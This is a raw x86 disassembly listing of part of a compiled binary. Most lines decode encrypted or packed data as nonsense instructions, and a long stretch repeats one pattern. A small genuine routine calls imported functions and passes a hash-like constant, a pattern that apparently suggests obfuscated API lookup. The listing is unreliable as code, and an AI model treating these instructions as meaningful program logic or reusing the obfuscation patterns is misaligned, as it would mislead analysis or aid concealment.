  422c15:	pushf  
  422c16:	clc    
  422c17:	and    al,0x3
  422c19:	pop    edx
  422c1a:	dec    eax
  422c1b:	mov    ch,0xde
  422c1d:	les    ebx,FWORD PTR [edi+0x45]
  422c20:	imul   ebp,esi,0xc711b109
  422c26:	pusha  
  422c27:	(bad)  
  422c28:	cmp    esi,DWORD PTR [ebp-0x8c5661b]
  422c2e:	push   esi
  422c2f:	xchg   dl,ch
  422c31:	out    dx,al
  422c32:	mov    eax,ds:0xf19f8c96
  422c37:	nop
  422c38:	dec    eax
  422c39:	out    dx,al
  422c3a:	jecxz  0x422c6d
  422c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c3d:	jp     0x422c5f
  422c3f:	rcl    dl,0x2c
  422c42:	and    ecx,DWORD PTR [ebx]
  422c44:	rcl    BYTE PTR [eax+0x38e5b552],cl
  422c4a:	outs   dx,BYTE PTR ds:[esi]
  422c4b:	jnp    0x422cc9
  422c4d:	xchg   DWORD PTR [esi],ebp
  422c4f:	sbb    al,0x7f
  422c51:	mov    BYTE PTR [di-0x3f],ah
  422c55:	jmp    0x5631:0x4383fe3e
  422c5c:	aaa    
  422c5d:	imul   ebp,ecx,0xffffffc9
  422c60:	jl     0x422beb
  422c62:	pop    ecx
  422c63:	fld    QWORD PTR [edx+0x2e]
  422c66:	push   eax
  422c67:	fdivr  DWORD PTR [edx-0x7]
  422c6a:	add    DWORD PTR [edi],edi
  422c6c:	jg     0x422bee
  422c6e:	test   eax,0x88dadfa6
  422c73:	add    eax,0x26e2f897
  422c78:	push   edi
  422c79:	or     ebp,DWORD PTR [eax+ecx*4]
  422c7c:	xchg   edi,eax
  422c7d:	hlt    
  422c7e:	aam    0x62
  422c80:	inc    eax
  422c81:	leave  
  422c82:	dec    esi
  422c83:	inc    ecx
  422c84:	outs   dx,BYTE PTR ds:[esi]
  422c85:	imul   edi,DWORD PTR [ebp+0x44],0xffffff9a
  422c89:	std    
  422c8a:	ror    DWORD PTR [esi-0x5ffacb67],1
  422c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c91:	lea    ebx,[ebx]
  422c93:	imul   edx,DWORD PTR [edx],0xffde9ce0
  422c99:	xor    eax,0xcf467c00
  422c9e:	xor    BYTE PTR [edx+0x77],0x9c
  422ca2:	jmp    DWORD PTR [edi]
  422ca4:	div    BYTE PTR [edi-0x1e]
  422ca7:	icebp  
  422ca8:	pop    esp
  422ca9:	or     ah,0x32
  422cac:	adc    DWORD PTR [edx-0x5a],ebp
  422caf:	or     al,0x60
  422cb1:	and    al,0xe1
  422cb3:	ret    0xc756
  422cb6:	and    ecx,DWORD PTR [eax]
  422cb8:	(bad)
  422cbb:	inc    ecx
  422cbc:	clc    
  422cbd:	popa   
  422cbe:	mov    edi,0x901598b1
  422cc3:	imul   esi,DWORD PTR [eax+0x6d],0x28
  422cc7:	mul    BYTE PTR [eax+0xc]
  422cca:	and    al,0xb9
  422ccc:	xor    al,0x51
  422cce:	adc    al,0x10
  422cd0:	aad    0xab
  422cd2:	fs inc edx
  422cd4:	cdq    
  422cd5:	adc    DWORD PTR [ebp+eiz*8-0x1f],esp
  422cd9:	das    
  422cda:	cld    
  422cdb:	aas    
  422cdc:	push   ss
  422cdd:	cmp    dl,BYTE PTR cs:[edx-0x2e2e0160]
  422ce4:	push   ds
  422ce5:	and    cl,ch
  422ce7:	ret    0x4c20
  422cea:	sub    eax,0x64623107
  422cef:	mov    ch,0xe1
  422cf1:	fcomp  DWORD PTR [ecx+edi*2-0x398d064d]
  422cf8:	adc    ah,cl
  422cfa:	jae    0x422d22
  422cfc:	sbb    ebp,edi
  422cfe:	out    0xf3,eax
  422d00:	adc    al,BYTE PTR [ebx+0x65]
  422d03:	mov    DWORD PTR [ebp+0x50],edi
  422d06:	iret   
  422d07:	sub    DWORD PTR [eax-0xd],edx
  422d0a:	cmp    BYTE PTR [ecx+esi*8+0xc],bl
  422d0e:	mov    bh,0xf8
  422d10:	loopne 0x422d37
  422d12:	dec    eax
  422d13:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  422d15:	aad    0x8f
  422d17:	mov    ebp,edi
  422d19:	xor    ch,dh
  422d1b:	imul   eax,DWORD PTR [ebx+0x3f],0x13
  422d1f:	aam    0x37
  422d21:	mov    esi,0x66fad393
  422d26:	pusha  
  422d27:	mov    bh,0xc4
  422d29:	pop    edx
  422d2a:	jge    0x422d20
  422d2c:	out    dx,al
  422d2d:	xor    eax,0x7e1a70d0
  422d32:	pop    ecx
  422d33:	mov    BYTE PTR [ebx-0x42a4aa7e],dh
  422d39:	ss jmp 0xb776b852
  422d3f:	pop    ebx
  422d40:	push   ebp
  422d41:	repz jp 0x422d7d
  422d44:	std    
  422d45:	inc    ebp
  422d46:	pop    ds
  422d47:	sub    ah,al
  422d49:	scas   al,BYTE PTR es:[edi]
  422d4a:	(bad)  
  422d4b:	inc    ebx
  422d4c:	push   esp
  422d4d:	bound  ebx,QWORD PTR [eax+ebx*2]
  422d50:	mov    ds:0x45553f20,al
  422d55:	and    al,ah
  422d57:	pusha  
  422d58:	test   dl,dl
  422d5a:	test   eax,0xa0c73a1c
  422d5f:	icebp  
  422d60:	add    ah,dl
  422d62:	dec    edx
  422d63:	jp     0x422d69
  422d65:	dec    esp
  422d66:	inc    edi
  422d67:	jno    0x422d94
  422d69:	jae    0x422db1
  422d6b:	popa   
  422d6c:	add    BYTE PTR [eax],0xdb
  422d6f:	mov    es:0xa2435e8e,eax
  422d75:	add    ecx,DWORD PTR [eax]
  422d77:	adc    esi,DWORD PTR [edx+ebx*1-0x7]
  422d7b:	nop
  422d7c:	push   0xffffff9c
  422d7e:	or     ch,BYTE PTR [esi]
  422d80:	sbb    al,0x1e
  422d82:	or     al,0x56
  422d84:	dec    esp
  422d85:	sbb    dh,al
  422d87:	cwde   
  422d88:	mov    esp,0xb9bc6b03
  422d8d:	mov    ds:0x2cf24a20,al
  422d92:	adc    DWORD PTR [edi-0xc],eax
  422d95:	cmp    ebp,DWORD PTR [edx+0x3c]
  422d98:	ja     0x422de3
  422d9a:	sub    BYTE PTR [ebp+0x5c841b46],bh
  422da0:	adc    ah,BYTE PTR [ebx+edi*8+0x55c4e756]
  422da7:	or     eax,0x3cef7f6f
  422dac:	loop   0x422d45
  422dae:	inc    esp
  422daf:	aas    
  422db0:	data16 clc 
  422db2:	dec    eax
  422db3:	sbb    DWORD PTR [eax+0x5b],ecx
  422db6:	enter  0x8e3,0x5e
  422dba:	enter  0xd555,0x82
  422dbe:	or     dl,BYTE PTR [esi-0x182bd556]
  422dc4:	and    eax,0xa7eb7650
  422dc9:	in     eax,dx
  422dca:	pop    esp
  422dcb:	popa   
  422dcc:	jle    0x422de5
  422dce:	sub    al,0x96
  422dd0:	test   BYTE PTR [eax+0x15],0x5d
  422dd4:	mov    ebx,0x28e89988
  422dd9:	mov    WORD PTR [eax-0x3],fs
  422ddc:	push   ds
  422ddd:	cmc    
  422dde:	imul   edi,DWORD PTR [ecx+0x1ecaa147],0xf56ee847
  422de8:	cwde   
  422de9:	xchg   edi,eax
  422dea:	or     al,0x6a
  422dec:	leave  
  422ded:	xor    eax,0x37ee9ca1
  422df2:	shr    BYTE PTR [ebx],1
  422df4:	mov    ecx,0x3a59f9db
  422df9:	in     eax,dx
  422dfa:	jb     0x422e2e
  422dfc:	xchg   ebx,eax
  422dfd:	mov    bh,0xed
  422dff:	push   0xffffffd0
  422e01:	pushf  
  422e02:	arpl   WORD PTR [eax-0xa],dx
  422e05:	mov    eax,0x8f1b3a11
  422e0a:	aaa    
  422e0b:	mov    ebp,DWORD PTR [eax]
  422e0d:	and    BYTE PTR [esi-0x2d82df2d],dl
  422e13:	or     edx,esi
  422e15:	mov    dh,BYTE PTR [edi+0x48ef7ec0]
  422e1b:	or     bl,BYTE PTR [edx]
  422e1d:	or     dh,dl
  422e1f:	mov    ebx,0xea9eec09
  422e24:	arpl   WORD PTR [ebp+0x17],bx
  422e27:	ds inc ebp
  422e29:	out    0xbc,eax
  422e2b:	fmul   st(7),st
  422e2d:	imul   esi,ecx,0x613bb7d7
  422e33:	cmp    edx,DWORD PTR [ecx-0x40]
  422e36:	sub    eax,0xb92a3177
  422e3b:	das    
  422e3c:	int    0x6f
  422e3e:	xor    DWORD PTR [eax+0x4ed47410],ebp
  422e44:	aad    0x44
  422e46:	adc    al,0x67
  422e48:	xor    DWORD PTR [edi],edi
  422e4a:	mov    WORD PTR [esi+0x7b],ss
  422e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e4e:	add    eax,0xdc36167
  422e53:	push   eax
  422e54:	leave  
  422e55:	fst    st(0)
  422e57:	je     0x422e0b
  422e59:	sbb    eax,0xb0c5d6e1
  422e5e:	dec    edi
  422e5f:	push   ebp
  422e60:	or     DWORD PTR [ebx+0x15],ebp
  422e63:	ins    DWORD PTR es:[edi],dx
  422e64:	jns    0x422e90
  422e66:	mov    edx,ss
  422e68:	or     esp,DWORD PTR [ecx-0x7858c55f]
  422e6e:	fistp  DWORD PTR [ebx]
  422e70:	clc    
  422e71:	jb     0x422e7d
  422e73:	xchg   edx,eax
  422e74:	mov    ebx,0x64ed61ce
  422e79:	loop   0x422e32
  422e7b:	lahf   
  422e7c:	xchg   esi,eax
  422e7d:	cmp    eax,0x4aea2fd2
  422e82:	jl     0x422ee2
  422e84:	pop    ecx
  422e85:	mov    al,ds:0xef918e34
  422e8a:	mov    gs,WORD PTR [eax+ebx*2-0x8]
  422e8e:	bound  ebp,QWORD PTR [ebx+0x5f]
  422e91:	popa   
  422e92:	imul   edi,DWORD PTR [ebx+0x61fd782d],0x41
  422e99:	(bad)  
  422e9a:	sub    eax,0x8239c86a
  422e9f:	mov    ebx,0xabfebe3c
  422ea4:	loope  0x422ef3
  422ea6:	jbe    0x422e31
  422ea8:	jl     0x422f09
  422eaa:	test   BYTE PTR [edx-0x63bc6992],dh
  422eb0:	imul   edx,DWORD PTR [esi+eax*8-0x7e],0xfc5c808f
  422eb8:	inc    esi
  422eb9:	outs   dx,DWORD PTR ds:[esi]
  422ebb:	adc    eax,0x9
  422ebe:	test   al,0xfc
  422ec0:	xchg   ebx,eax
  422ec1:	add    cl,0x4b
  422ec4:	cmp    DWORD PTR [ebx+0x15af4540],edx
  422eca:	adc    bh,dl
  422ecc:	mov    cl,0xa1
  422ece:	mov    al,ds:0xf24347de
  422ed3:	xor    BYTE PTR [ebx],0x4f
  422ed6:	jns    0x422ee4
  422ed8:	rcl    DWORD PTR [eax],0x4e
  422edb:	xchg   ebp,eax
  422edc:	jl     0x422ea8
  422ede:	int3   
  422edf:	xor    DWORD PTR [ebx],edi
  422ee1:	dec    eax
  422ee2:	cmp    eax,0xae339f76
  422ee7:	clc    
  422ee8:	push   0xffffffd2
  422eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422eeb:	or     eax,0x75bc6e42
  422ef0:	cs and al,0x80
  422ef3:	mov    ecx,0x629ee931
  422ef8:	mov    bh,0x25
  422efa:	rol    BYTE PTR ds:[ebx+0xd806280],1
  422f01:	xor    BYTE PTR [esp+ebp*2],ah
  422f04:	or     al,BYTE PTR [ebx-0x3]
  422f07:	ss push ebp
  422f09:	jle    0x422f62
  422f0b:	(bad)  
  422f0c:	or     DWORD PTR [edx+0x3a],esi
  422f0f:	fs scas al,BYTE PTR es:[edi]
  422f11:	mov    es,WORD PTR [ecx-0x78]
  422f14:	test   DWORD PTR [ecx+0x5c],0x7c1d8fd7
  422f1b:	xchg   ebx,eax
  422f1c:	pop    esp
  422f1d:	mov    ebp,0x93b4f356
  422f22:	xchg   esp,eax
  422f23:	mov    dl,BYTE PTR [edx+0x5]
  422f26:	push   es
  422f27:	ds xchg esp,eax
  422f29:	mov    eax,0x1
  422f2e:	mov    esp,ebp
  422f30:	pop    ebp
  422f31:	ret    
  422f32:	int3   
  422f33:	int3   
  422f34:	int3   
  422f35:	int3   
  422f36:	int3   
  422f37:	int3   
  422f38:	int3   
  422f39:	int3   
  422f3a:	int3   
  422f3b:	int3   
  422f3c:	int3   
  422f3d:	int3   
  422f3e:	int3   
  422f3f:	int3   
  422f40:	push   ebp
  422f41:	mov    ebp,esp
  422f43:	sub    esp,0x8
  422f46:	mov    eax,ds:0x429028
  422f4b:	push   esi
  422f4c:	push   0x0
  422f4e:	push   0x4e
  422f50:	push   0x1e
  422f52:	push   0x0
  422f54:	push   0xffffffff
  422f56:	mov    DWORD PTR [ebp-0x4],0x0
  422f5d:	mov    DWORD PTR [ebp-0x8],eax
  422f60:	call   DWORD PTR ds:0x429038
  422f66:	mov    esi,DWORD PTR [ebp-0x8]
  422f69:	call   esi
  422f6b:	mov    DWORD PTR [ebp-0x4],eax
  422f6e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f72:	jne    0x422f81
  422f74:	push   0xca52e009
  422f79:	call   0x4111f0
  422f7e:	add    esp,0x4
  422f81:	xor    eax,eax
  422f83:	pop    esi
  422f84:	mov    esp,ebp
  422f86:	pop    ebp
  422f87:	ret    
  422f88:	nop
  422f89:	nop
  422f8a:	nop
  422f8b:	nop
  422f8c:	nop
  422f8d:	nop
  422f8e:	nop
  422f8f:	nop
  422f90:	sub    esp,0x10
  422f93:	push   0x0
  422f95:	push   0x0
  422f97:	push   0x0
  422f99:	call   DWORD PTR ds:0x429034
  422f9f:	lea    eax,[esp+0x0]
  422fa3:	push   eax
  422fa4:	call   DWORD PTR ds:0x42903c
  422faa:	cmp    WORD PTR [esp+0x0],0x0
  422fb0:	je     0x422fd2
  422fb2:	push   0x0
  422fb4:	call   0x422f40
  422fb9:	add    esp,0x4
  422fbc:	call   0x411000
  422fc1:	push   0x0
  422fc3:	push   0x0
  422fc5:	call   0x424410
  422fca:	xor    eax,eax
  422fcc:	add    esp,0x10
  422fcf:	ret    0x10
  422fd2:	dec    DWORD PTR [esi-0x702a67c5]
  422fd8:	cli    
  422fd9:	dec    eax
  422fda:	sti    
  422fdb:	js     0x422ffa
  422fdd:	sbb    ebp,ebp
  422fdf:	test   eax,0x6d08613c
  422fe4:	mov    edx,?
  422fe6:	dec    eax
  422fe7:	sti    
  422fe8:	jl     0x423007
  422fea:	sbb    DWORD PTR [ebp+0x861c356],ebp
  422ff0:	aad    0x8c
  422ff2:	cli    
  422ff3:	dec    eax
  422ff4:	sti    
  422ff5:	jl     0x423014
  422ff7:	sbb    ebp,ebp
  422ff9:	push   esi
  422ffa:	ret    
  422ffb:	popa   
  422ffc:	or     ch,dl
  422ffe:	mov    edx,?
  423000:	dec    eax
  423001:	sti    
  423002:	jl     0x423021
  423004:	sbb    ebp,ebp
  423006:	push   esi
  423007:	ret    
  423008:	popa   
  423009:	or     ch,dl
  42300b:	mov    edx,?
  42300d:	dec    eax
  42300e:	sti    
  42300f:	test   BYTE PTR ds:0xdc58ed19,bl
  423015:	fild   DWORD PTR [esi]
  423017:	aad    0x38
  423019:	repz test edx,ebx
  42301c:	les    ebx,FWORD PTR [edx*2+0x9977720]
  423023:	popa   
  423024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423025:	lods   al,BYTE PTR ds:[esi]
  423026:	mov    bh,BYTE PTR [edx]
  423028:	xchg   esp,eax
  423029:	sbb    ebp,DWORD PTR [edi+0x78]
  42302c:	xor    BYTE PTR [esi-0x60],0x0
  423030:	mov    bx,0x8ee3
  423034:	push   0x6b3d1999
  423039:	cwde   
  42303a:	cmp    bl,ah
  42303c:	or     BYTE PTR [esi-0xb],ah
  42303f:	enter  0x1bb5,0xdb
  423043:	adc    DWORD PTR [edx+0x7d],esi
  423046:	mov    BYTE PTR [eax-0x32],bh
  423049:	ins    BYTE PTR es:[edi],dx
  42304a:	add    dh,cl
  42304c:	mov    edx,?
  42304e:	dec    eax
  42304f:	sti    
  423050:	jl     0x42306f
  423052:	sbb    edx,ebp
  423054:	iret   
  423055:	aas    
  423056:	cmp    BYTE PTR [ebx+0x2d],cl
  423059:	push   ds
  42305a:	lock or eax,DWORD PTR [ebx]
  42305d:	out    dx,al
  42305e:	pop    ss
  42305f:	pop    edx
  423060:	adc    eax,0x6d39c9c4
  423065:	fld    DWORD PTR [esi+0x7669b0a5]
  42306b:	inc    ebp
  42306c:	jl     0x423043
  42306e:	pop    esp
  42306f:	add    DWORD PTR [ecx-0x602b2066],ebx
  423075:	jno    0x423068
  423077:	adc    al,0xe5
  423079:	mov    esp,edi
  42307b:	jp     0x4230ca
  42307d:	pop    eax
  42307e:	add    dl,BYTE PTR [ebx-0x4ebd978c]
  423084:	cld    
  423085:	or     al,0x13
  423087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423088:	scas   al,BYTE PTR es:[edi]
  423089:	push   ecx
  42308a:	imul   eax,DWORD PTR [edx+0x55],0xffffff8d
  42308e:	lock adc BYTE PTR [ebx],al
  423091:	out    dx,al
  423092:	pop    ss
  423093:	pop    edx
  423094:	adc    eax,0xf149c9c5
  423099:	inc    edi
  42309a:	xchg   BYTE PTR [ebp-0x70],al
  42309d:	jnp    0x423115
  42309f:	push   eax
  4230a0:	loope  0x423121
  4230a2:	pop    esp
  4230a3:	fwait
  4230a4:	add    al,0x35
  4230a6:	fild   WORD PTR [edx+eax*1+0x7824f1da]
  4230ad:	adc    edi,esp
  4230af:	adc    al,0x3b
  4230b1:	repz add cl,BYTE PTR [ebp-0x46bd0a17]
  4230b8:	test   BYTE PTR [edi-0x5fc040ed],cl
  4230be:	or     DWORD PTR [ebx+0x2d],ecx
  4230c1:	push   ds
  4230c2:	lock dec eax
  4230c4:	sti    
  4230c5:	jl     0x4230e4
  4230c7:	sbb    ebp,ebp
  4230c9:	push   esi
  4230ca:	ret    
  4230cb:	xor    DWORD PTR [ebp-0x2b],ecx
  4230ce:	mov    WORD PTR [esi-0xe8306b7],?
  4230d4:	cli    
  4230d5:	mov    dl,0x19
  4230d7:	ret    
  4230d8:	popa   
  4230d9:	or     ch,dl
  4230db:	mov    edx,?
  4230dd:	dec    eax
  4230de:	sti    
  4230df:	pushf  
  4230e0:	sbb    eax,0xc25dec1a
  4230e5:	imul   ecx,DWORD PTR [eax],0xffffffd5
  4230e8:	pusha  
  4230e9:	dec    BYTE PTR [eax-0x5]
  4230ec:	js     0x423109
  4230ee:	sbb    ebp,ebp
  4230f0:	push   esi
  4230f1:	ret    
  4230f2:	popa   
  4230f3:	or     DWORD PTR [eax-0x74],ebp
  4230f6:	cli    
  4230f7:	dec    eax
  4230f8:	jmp    0x423176
  4230fa:	sbb    eax,0xc353ed19
  4230ff:	popa   
  423100:	or     BYTE PTR [esp+ecx*4+0x7cfb58fa],dl
  423107:	sbb    eax,0xc656ed1b
  42310c:	popa   
  42310d:	or     ebp,edx
  42310f:	mov    edx,?
  423111:	dec    eax
  423112:	sti    
  423113:	jns    0x423132
  423115:	sbb    ch,ch
  423117:	push   esi
  423118:	ret    
  423119:	popa   
  42311a:	or     ch,dl
  42311c:	or     al,0xf1
  42311e:	dec    eax
  42311f:	sti    
  423120:	js     0x42313f
  423122:	sbb    DWORD PTR [eax+0x67],edx
  423125:	(bad)  
  423126:	popa   
  423127:	or     dl,ch
  423129:	mov    WORD PTR [edx+0x48],?
  42312c:	sti    
  42312d:	ins    BYTE PTR es:[edi],dx
  42312e:	sbb    eax,0xc356fd19
  423133:	popa   
  423134:	or     ch,al
  423136:	mov    edx,?
  423138:	pop    eax
  423139:	sti    
  42313a:	jl     0x423159
  42313c:	sbb    ebp,ebp
  42313e:	push   esi
  42313f:	shl    DWORD PTR [ecx+0x8],cl
  423142:	aad    0x8c
  423144:	cli    
  423145:	dec    eax
  423146:	sti    
  423147:	jl     0x423166
  423149:	sbb    ebp,ebp
  42314b:	shr    BYTE PTR [ebp-0x7043f796],cl
  423151:	cli    
  423152:	dec    eax
  423153:	sti    
  423154:	dec    esp
  423155:	push   ss
  423156:	sbb    DWORD PTR [edx],esp
  423158:	imul   eax,ebx,0x61
  42315b:	or     ch,dl
  42315d:	mov    edx,?
  42315f:	dec    eax
  423160:	sti    
  423161:	jl     0x423180
  423163:	sbb    ebp,ebp
  423165:	push   esi
  423166:	ret    
  423167:	popa   
  423168:	or     ch,dl
  42316a:	mov    edx,?
  42316c:	dec    eax
  42316d:	sti    
  42316e:	jl     0x42318d
  423170:	sbb    ebp,ebp
  423172:	push   esi
  423173:	ret    
  423174:	popa   
  423175:	or     ch,dl
  423177:	mov    edx,?
  423179:	dec    eax
  42317a:	sti    
  42317b:	jl     0x42319a
  42317d:	sbb    ebp,ebp
  42317f:	push   esi
  423180:	ret    
  423181:	popa   
  423182:	or     ch,dl
  423184:	mov    edx,?
  423186:	dec    eax
  423187:	sti    
  423188:	jl     0x4231a7
  42318a:	sbb    ebp,ebp
  42318c:	push   esi
  42318d:	ret    
  42318e:	popa   
  42318f:	or     ch,dl
  423191:	mov    edx,?
  423193:	dec    eax
  423194:	sti    
  423195:	jl     0x4231b4
  423197:	sbb    ebp,ebp
  423199:	push   esi
  42319a:	ret    
  42319b:	popa   
  42319c:	or     ch,dl
  42319e:	mov    edx,?
  4231a0:	dec    eax
  4231a1:	sti    
  4231a2:	jl     0x4231c1
  4231a4:	sbb    ebp,ebp
  4231a6:	push   esi
  4231a7:	ret    
  4231a8:	popa   
  4231a9:	or     ch,dl
  4231ab:	mov    edx,?
  4231ad:	dec    eax
  4231ae:	sti    
  4231af:	jl     0x4231ce
  4231b1:	sbb    ebp,ebp
  4231b3:	push   esi
  4231b4:	ret    
  4231b5:	popa   
  4231b6:	or     ch,dl
  4231b8:	mov    edx,?
  4231ba:	dec    eax
  4231bb:	sti    
  4231bc:	jl     0x4231db
  4231be:	sbb    ebp,ebp
  4231c0:	push   esi
  4231c1:	ret    
  4231c2:	popa   
  4231c3:	mov    eax,es:0xfb3c82e9
  4231c9:	jl     0x4231e8
  4231cb:	sbb    ebp,ecx
  4231cd:	pop    ebp
  4231ce:	ret    
  4231cf:	popa   
  4231d0:	sbb    ch,dl
  4231d2:	mov    edx,?
  4231d4:	jb     0x4231d5
  4231d6:	jl     0x4231f5
  4231d8:	sbb    eax,0x249356ed
  4231dd:	dec    ebx
  4231de:	out    0xd8,eax
  4231e0:	mov    ch,0x48
  4231e2:	sti    
  4231e3:	jl     0x423202
  4231e5:	sbb    ebp,ebp
  4231e7:	jbe    0x4231ac
  4231e9:	popa   
  4231ea:	call   0x3acc30ea
  4231ef:	cwde   
  4231f0:	jl     0x42320f
  4231f2:	sbb    ebp,ebp
  4231f4:	push   es
  4231f5:	ret    
  4231f6:	popa   
  4231f7:	or     ch,ah
  4231f9:	xchg   edx,edi
  4231fb:	dec    eax
  4231fc:	stos   DWORD PTR es:[edi],eax
  4231fd:	jl     0x42321c
  4231ff:	sbb    ebx,edx
  423201:	push   edx
  423202:	ret    
  423203:	popa   
  423204:	or     ch,dl
  423206:	mov    edx,?
  423208:	dec    eax
  423209:	sti    
  42320a:	jl     0x423229
  42320c:	sbb    ebp,ebp
  42320e:	push   esi
  42320f:	jecxz  0x423272
  423211:	or     BYTE PTR ds:0xfb48fa8c,dh
  423217:	jl     0x423236
  423219:	sbb    ebp,ebp
  42321b:	push   esi
  42321c:	ret    
  42321d:	popa   
  42321e:	or     ch,dl
  423220:	mov    edx,?
  423222:	dec    eax
  423223:	sti    
  423224:	jl     0x423243
  423226:	sbb    ebp,ebp
  423228:	push   esi
  423229:	ret    
  42322a:	popa   
  42322b:	or     ch,dl
  42322d:	mov    edx,?
  42322f:	dec    eax
  423230:	sti    
  423231:	jl     0x423250
  423233:	sbb    ebp,ebp
  423235:	push   esi
  423236:	ret    
  423237:	popa   
  423238:	or     ch,dl
  42323a:	mov    edx,?
  42323c:	dec    eax
  42323d:	sti    
  42323e:	jl     0x42325d
  423240:	sbb    ebp,ebp
  423242:	push   esi
  423243:	ret    
  423244:	popa   
  423245:	or     ch,dl
  423247:	mov    edx,?
  423249:	dec    eax
  42324a:	sti    
  42324b:	jl     0x42326a
  42324d:	sbb    ebp,ebp
  42324f:	push   esi
  423250:	ret    
  423251:	popa   
  423252:	or     ch,dl
  423254:	mov    edx,?
  423256:	dec    eax
  423257:	sti    
  423258:	jl     0x423277
  42325a:	sbb    ebp,ebp
  42325c:	push   esi
  42325d:	ret    
  42325e:	popa   
  42325f:	or     ch,dl
  423261:	mov    edx,?
  423263:	dec    eax
  423264:	sti    
  423265:	jl     0x423284
  423267:	sbb    ebp,ebp
  423269:	push   esi
  42326a:	ret    
  42326b:	popa   
  42326c:	or     ch,dl
  42326e:	mov    edx,?
  423270:	dec    eax
  423271:	sti    
  423272:	jl     0x423291
  423274:	sbb    ebp,ebp
  423276:	push   esi
  423277:	ret    
  423278:	popa   
  423279:	or     ch,dl
  42327b:	mov    edx,?
  42327d:	dec    eax
  42327e:	sti    
  42327f:	jl     0x42329e
  423281:	sbb    ebp,ebp
  423283:	push   esi
  423284:	ret    
  423285:	popa   
  423286:	or     ch,dl
  423288:	mov    edx,?
  42328a:	dec    eax
  42328b:	sti    
  42328c:	jl     0x4232ab
  42328e:	sbb    ebp,ebp
  423290:	push   esi
  423291:	ret    
  423292:	popa   
  423293:	or     ch,dl
  423295:	mov    edx,?
  423297:	dec    eax
  423298:	sti    
  423299:	jl     0x4232b8
  42329b:	sbb    ebp,ebp
  42329d:	push   esi
  42329e:	ret    
  42329f:	popa   
  4232a0:	or     ch,dl
  4232a2:	mov    edx,?
  4232a4:	dec    eax
  4232a5:	sti    
  4232a6:	jl     0x4232c5
  4232a8:	sbb    ebp,ebp
  4232aa:	push   esi
  4232ab:	ret    
  4232ac:	popa   
  4232ad:	or     ch,dl
  4232af:	mov    edx,?
  4232b1:	dec    eax
  4232b2:	sti    
  4232b3:	jl     0x4232d2
  4232b5:	sbb    ebp,ebp
  4232b7:	push   esi
  4232b8:	ret    
  4232b9:	popa   
  4232ba:	or     ch,dl
  4232bc:	mov    edx,?
  4232be:	dec    eax
  4232bf:	sti    
  4232c0:	jl     0x4232df
  4232c2:	sbb    ebp,ebp
  4232c4:	push   esi
  4232c5:	ret    
  4232c6:	popa   
  4232c7:	or     ch,dl
  4232c9:	mov    edx,?
  4232cb:	dec    eax
  4232cc:	sti    
  4232cd:	jl     0x4232ec
  4232cf:	sbb    ebp,ebp
  4232d1:	push   esi
  4232d2:	ret    
  4232d3:	popa   
  4232d4:	or     ch,dl
  4232d6:	mov    edx,?
  4232d8:	dec    eax
  4232d9:	sti    
  4232da:	jl     0x4232f9
  4232dc:	sbb    ebp,ebp
  4232de:	push   esi
  4232df:	ret    
  4232e0:	popa   
  4232e1:	or     ch,dl
  4232e3:	mov    edx,?
  4232e5:	dec    eax
  4232e6:	sti    
  4232e7:	jl     0x423306
  4232e9:	sbb    ebp,ebp
  4232eb:	push   esi
  4232ec:	ret    
  4232ed:	popa   
  4232ee:	or     ch,dl
  4232f0:	mov    edx,?
  4232f2:	dec    eax
  4232f3:	sti    
  4232f4:	jl     0x423313
  4232f6:	sbb    ebp,ebp
  4232f8:	push   esi
  4232f9:	ret    
  4232fa:	popa   
  4232fb:	or     ch,dl
  4232fd:	mov    edx,?
  4232ff:	dec    eax
  423300:	sti    
  423301:	jl     0x423320
  423303:	sbb    ebp,ebp
  423305:	push   esi
  423306:	ret    
  423307:	popa   
  423308:	or     ch,dl
  42330a:	mov    edx,?
  42330c:	dec    eax
  42330d:	sti    
  42330e:	jl     0x42332d
  423310:	sbb    ebp,ebp
  423312:	push   esi
  423313:	ret    
  423314:	popa   
  423315:	or     ch,dl
  423317:	mov    edx,?
  423319:	dec    eax
  42331a:	sti    
  42331b:	jl     0x42333a
  42331d:	sbb    ebp,ebp
  42331f:	push   esi
  423320:	ret    
  423321:	popa   
  423322:	or     ch,dl
  423324:	mov    edx,?
  423326:	dec    eax
  423327:	sti    
  423328:	jl     0x423347
  42332a:	sbb    ebp,ebp
  42332c:	push   esi
  42332d:	ret    
  42332e:	popa   
  42332f:	or     ch,dl
  423331:	mov    edx,?
  423333:	dec    eax
  423334:	sti    
  423335:	jl     0x423354
  423337:	sbb    ebp,ebp
  423339:	push   esi
  42333a:	ret    
  42333b:	popa   
  42333c:	or     ch,dl
  42333e:	mov    edx,?
  423340:	dec    eax
  423341:	sti    
  423342:	jl     0x423361
  423344:	sbb    ebp,ebp
  423346:	push   esi
  423347:	ret    
  423348:	popa   
  423349:	or     ch,dl
  42334b:	mov    edx,?
  42334d:	dec    eax
  42334e:	sti    
  42334f:	jl     0x42336e
  423351:	sbb    ebp,ebp
  423353:	push   esi
  423354:	ret    
  423355:	popa   
  423356:	or     ch,dl
  423358:	mov    edx,?
  42335a:	dec    eax
  42335b:	sti    
  42335c:	jl     0x42337b
  42335e:	sbb    ebp,ebp
  423360:	push   esi
  423361:	ret    
  423362:	popa   
  423363:	or     ch,dl
  423365:	mov    edx,?
  423367:	dec    eax
  423368:	sti    
  423369:	jl     0x423388
  42336b:	sbb    ebp,ebp
  42336d:	push   esi
  42336e:	ret    
  42336f:	popa   
  423370:	or     ch,dl
  423372:	mov    edx,?
  423374:	dec    eax
  423375:	sti    
  423376:	jl     0x423395
  423378:	sbb    ebp,ebp
  42337a:	push   esi
  42337b:	ret    
  42337c:	popa   
  42337d:	or     ch,dl
  42337f:	mov    edx,?
  423381:	dec    eax
  423382:	sti    
  423383:	jl     0x4233a2
  423385:	sbb    ebp,ebp
  423387:	push   esi
  423388:	ret    
  423389:	popa   
  42338a:	or     ch,dl
  42338c:	mov    edx,?
  42338e:	dec    eax
  42338f:	sti    
  423390:	jl     0x4233af
  423392:	sbb    ebp,ebp
  423394:	push   esi
  423395:	ret    
  423396:	popa   
  423397:	or     ch,dl
  423399:	mov    edx,?
  42339b:	dec    eax
  42339c:	sti    
